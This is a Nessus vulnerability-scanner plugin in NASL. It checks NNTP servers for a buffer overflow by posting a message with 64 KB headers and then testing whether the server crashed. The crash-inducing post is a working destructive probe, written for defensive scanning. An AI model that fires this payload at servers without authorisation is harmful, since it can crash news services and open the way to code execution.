#
# (C) Tenable Network Security, Inc.
#

# Overflow on the user name is tested by cassandra_nntp_dos.nasl
#
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

include( 'compat.inc' );

if(description)
{
  script_id(17228);
  script_version("$Revision: 1.12 $");

  script_name(english:"NNTP Server Message Header Handling Remote Overflow");
  script_summary(english:"Sends a message with long headers to nntpd");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"Nessus was able to crash the remote NNTP server by sending
a message with long headers.

This flaw is probably a buffer overflow and might be exploitable
to run arbitrary code on this machine."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Apply the latest patches from your vendor or use different software."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");



 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/28");
 script_cvs_date("$Date: 2017/03/21 03:23:57 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service_3digits.nasl", "nntp_info.nasl");
  script_require_ports("Services/nntp", 119);
  script_require_keys("Settings/ExperimentalScripts");
  exit(0);
}

#
include('global_settings.inc');
include('nntp_func.inc');

# This script might kill other servers if the message is propagated
if (! experimental_scripts) exit(0, "This plugin only runs if experimental features are enabled.");

port = get_kb_item("Services/nntp");
if(!port) port = 119;
if(! get_port_state(port)) exit(0, "Port "+port+" is closed.");

user = get_kb_item("nntp/login");
pass = get_kb_item("nntp/password");

ready = get_kb_item("nntp/"+port+"/ready");
if (! ready) exit(0, "The NNTP server on port "+port+" is not ready.");

noauth = get_kb_item("nntp/"+port+"/noauth");
posting = get_kb_item("nntp/"+port+"/posting");

if (! noauth && (! user || ! pass))
 exit(0, "The NNTP server on port "+port+" requires authentication and credentials are missing.");
if (! posting) exit(0, "The NNTP server on port "+port+" does not allow posting.");

s = nntp_connect(port: port, username: user, password: pass);
if(! s) exit(1, "NTTP connection failed to port "+port+".");

len = 65536;

msg = strcat('Newsgroups: ', crap(len), '\r\n',
	'Subject: ', crap(len), '\r\n',
	'From: Nessus <', crap(len), '@example.com>\r\n',
	'Message-ID: <', crap(len), '@', crap(len), rand(), '.NESSUS>\r\n',
	'Lines: ', crap(data: '1234', length: len), '\r\n',
	'Distribution: local\r\n',	# To limit risks
	'\r\n',
	'Test message (post). Please ignore.\r\n',
	'.\r\n');

nntp_post(socket: s, message: msg);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(! s)
{
  security_hole(port);
  exit(0);
}
else
 close(s);
